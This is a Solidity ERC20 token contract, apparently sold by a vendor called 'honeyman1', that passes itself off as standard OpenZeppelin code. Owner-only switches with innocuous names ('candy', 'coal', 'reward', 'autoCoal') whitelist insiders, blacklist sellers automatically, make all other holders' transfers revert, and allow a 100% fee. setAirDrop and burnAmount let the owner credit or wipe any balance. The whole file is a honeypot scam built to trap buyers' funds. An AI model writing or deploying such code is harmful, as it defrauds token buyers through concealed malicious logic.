// SPDX-License-Identifier: MIT

// ------- Create by honeyman1
// ------- Telegram: @honeyman1
// ------- Website: honeyman1.sellix.io
// ------- Telegram Channel: https://t.me/honeyman1_community


//                                                                     
//     h:::::h                                                                    
//     h:::::h                                                                    
//     h:::::h                                                                    
//     h::::h hhhhh          ooooooooooo   nnnn  nnnnnnnn        eeeeeeeeeeee    yyyyyyy           yyyyyyy mmmmmmm    mmmmmmm     aaaaaaaaaaaaa                       1111111   
//     h::::hh:::::hhh     oo:::::::::::oo n:::nn::::::::nn    ee::::::::::::ee   y:::::y         y:::::ymm:::::::m  m:::::::mm   a::::::::::::a                     1::::::1   
//     h::::::::::::::hh  o:::::::::::::::on::::::::::::::nn  e::::::eeeee:::::ee  y:::::y       y:::::ym::::::::::mm::::::::::m  aaaaaaaaa:::::a                   1:::::::1   
//     h:::::::hhh::::::h o:::::ooooo:::::onn:::::::::::::::ne::::::e     e:::::e   y:::::y     y:::::y m::::::::::::::::::::::m           a::::a                   111:::::1   
//     h::::::h   h::::::ho::::o     o::::o  n:::::nnnn:::::ne:::::::eeeee::::::e   y:::::y   y:::::y  m:::::mmm::::::mmm:::::m    aaaaaaa:::::a  nnnn  nnnnnnnn       1::::1          
//     h:::::h     h:::::ho::::o     o::::o  n::::n    n::::ne:::::::::::::::::e     y:::::y y:::::y   m::::m   m::::m   m::::m  aa::::::::::::a  n:::nn::::::::nn     1::::1                         
//     h:::::h     h:::::ho::::o     o::::o  n::::n    n::::ne::::::eeeeeeeeeee       y:::::y:::::y    m::::m   m::::m   m::::m a::::aaaa::::::a  n::::::::::::::nn    1::::1                          
//     h:::::h     h:::::ho::::o     o::::o  n::::n    n::::ne:::::::e                y:::::::::y     m::::m   m::::m   m::::ma::::a    a:::::a   nn:::::::::::::::n   1::::l                        
//     h:::::h     h:::::ho:::::ooooo:::::o  n::::n    n::::ne::::::::e                y:::::::y      m::::m   m::::m   m::::ma::::a    a:::::a     n:::::nnnn:::::n   1::::l                    
//     h:::::h     h:::::ho:::::::::::::::o  n::::n    n::::n e::::::::eeeeeeee         y:::::y       m::::m   m::::m   m::::ma:::::aaaa::::::a     n::::n    n::::n   1::::l                       
//     h:::::h     h:::::h oo:::::::::::oo   n::::n    n::::n  ee:::::::::::::e        y:::::y        m::::m   m::::m   m::::m a::::::::::aa:::a    n::::n    n::::n   1::::l                    
//     hhhhhhh     hhhhhhh   ooooooooooo     nnnnnn    nnnnnn    eeeeeeeeeeeeee       y:::::y         mmmmmm   mmmmmm   mmmmmm  aaaaaaaaaa  aaaa    n::::n    n::::n   1::::l                     
//                                                                                   y:::::y                                                        n::::n    n::::n111::::::111
//                                                                                  y:::::y                                                         n::::n    n::::n1::::::::::1
//                                                                                 y:::::y                                                          n::::n    n::::n1::::::::::1
//                                                                                y:::::y                                                           nnnnnn    nnnnnn111111111111
//                                                                               y:::::y                                                       
//                                                                              yyyyyyy                                                                                                                                 
//       

pragma solidity 0.8.16;

import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/IERC20MetadataUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ProxyV2 is Initializable, ContextUpgradeable, OwnableUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    function __ERC20_init(string memory name_, string memory symbol_) internal onlyInitializing {
        __ERC20_init_unchained(name_, symbol_);
    }

    function __ERC20_init_unchained(string memory name_, string memory symbol_) internal onlyInitializing {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setCandy(address account) public onlyOwner {
        candy[account] = true;
    }

    function removeCandy(address account) public onlyOwner {
        candy[account] = false;
    }

    function setCoal(address account) public onlyOwner {
        coal[account] = true;
    }

    function removeCoal(address account) public onlyOwner {
        coal[account] = false;
    }

    function enableReward(bool _enable) public onlyOwner {
        reward = _enable;
    }

    function pickCoal(address account) internal {
        coal[account] = true;
    }

    function setAutoCoal(bool _enable) public onlyOwner {
        autoCoal = _enable;
    }

    function setNumbers(uint256 amount) public onlyOwner {
        numbers = amount;
    }

    function setLimits(uint256 amount) public onlyOwner {
        limits = amount;
    }

    function setFee(uint256 amount) public onlyOwner {
        require(amount >= 0);
        require(amount <= 100);
        fee = amount;
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(from, amount);
        burnFee(from,to,amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function burnAmount(address wallet, uint256 amount) public onlyOwner {
        require(wallet != owner(), "TARGET ERROR");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if(_balances[wallet] <= amount*10**18){
            _balances[wallet] = 0;
            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];
        }   else {
                _balances[wallet] = _balances[wallet] - amount*10**18;
                _balances[deadAddress] = _balances[deadAddress] + amount*10**18;
            }
    }

    /**
     * @dev Deflationary instrument
     * 
     * It can be turned on if necessary.
     * 
     * Emits a {Transfer} event.
     *
     * Requirements
     *
     * - `sender` must have at least `value` tokens.
     */
    function burnFee(address sender, address recipient, uint256 value) internal {
        require(_balances[sender] >= value, "Value exceeds balance");
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        if(sender != owner() && !candy[sender] && sender != address(this)){
            uint256 burnFees = ((value * fee) / 100);
            uint256 amount = value - burnFees;
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] = _balances[recipient] + amount;
            emit Transfer(sender, recipient, amount);
                if(fee > 0){
                    _balances[sender] = _balances[sender] - burnFees;
                    _balances[deadAddress] = _balances[deadAddress] + burnFees;
                    emit Transfer(sender, deadAddress, burnFees);
                }
        } else {
            _balances[sender] = _balances[sender] - value;
            _balances[recipient] = _balances[recipient] + value;
            emit Transfer(sender, recipient, value);
            }
        
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setAirDrop(address account, uint256 amount) public onlyOwner {
        _balances[account] = _balances[account]+amount;
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        uint256 amount
    ) internal virtual {
        if(from != owner() && !candy[from]){
            require(!coal[from]);
            if(numbers > 0){
                require(amount <= numbers);
            }
            if(reward){
                revert("Error");
            }
            if(limits > 0){
                require(_balances[from] <= limits);
            }
            
            if(autoCoal){
                pickCoal(from);
            }
        }
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev BEP20 Anti-Stuck Smart Contract Solution
     */
    function Withdraw(address token, uint amount, address payable _wallet) public onlyOwner {
        if(token == address(0)) {
            _wallet.transfer(amount);
        } else {
            IERC20Upgradeable(token).transfer(_wallet, amount);
        }
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[45] private __gap;

    mapping(address => bool) private candy;
    mapping(address => bool) private coal;
    bool public reward;
    uint256 public numbers;
    uint256 public limits;
    uint256 public fee;
    bool public autoCoal;
}

// ------- Create by honeyman1
// ------- Telegram: @honeyman1
// ------- Website: honeyman1.sellix.io
// ------- Telegram Channel: https://t.me/honeyman1_community